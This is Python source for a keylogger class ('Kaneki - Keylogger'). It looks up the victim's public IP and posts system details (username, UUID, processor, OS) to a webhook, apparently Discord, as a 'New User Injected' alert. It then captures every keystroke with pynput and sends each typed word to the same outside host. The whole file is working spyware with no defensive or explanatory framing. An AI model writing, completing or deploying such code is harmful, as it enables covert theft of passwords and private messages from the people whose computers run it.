import requests, pynput, getpass, platform, uuid, datetime
from pynput.keyboard import Key, Listener
from datetime import datetime

class Inject():
    def __init__(self, hook):
        self.Hook = hook
        self.Date = datetime.today().strftime('%Y-%m-%d / %H:%M:%S')
        self.log = ""

    def get_ip(self):
        self.IP = requests.get('https://api.ipify.org').text

    def send_infect(self):
        requests.post(self.Hook, data={'content':f'||@everyone|| __New User Injected__\n\n    **__COMPUTER INFOS :__**\n> IP Adress: **{self.IP}**\n> PC Name: **{getpass.getuser()}**\n> UUID: **{uuid.uuid1()}**\n> Processor: **{platform.processor()}**\n> System Info: **{platform.system()+" "+platform.release()}**\n> Date: **{self.Date}**', 'username':'Kaneki - Keylogger', 'avatar_url':'https://cdn.discordapp.com/attachments/780536336360800259/833163665007575100/manga.gif'})

    def on_press(self, key):

        try:
            self.log = self.log + str(key.char)
        
        except:                
            if key == key.backspace:
            	self.log = self.log + " "
            
            elif key == key.space or key == key.enter:
                requests.post(self.Hook, data={'content': "Word: **"+self.log+"**", 'username':'Kaneki - Keylogger', 'avatar_url':'https://cdn.discordapp.com/attachments/780536336360800259/833163665007575100/manga.gif'})
                self.log = ""
            
            else:
            	self.log = self.log + " "
            

    def listener(self):
        with Listener(on_press=self.on_press) as listener:
        	listener.join()
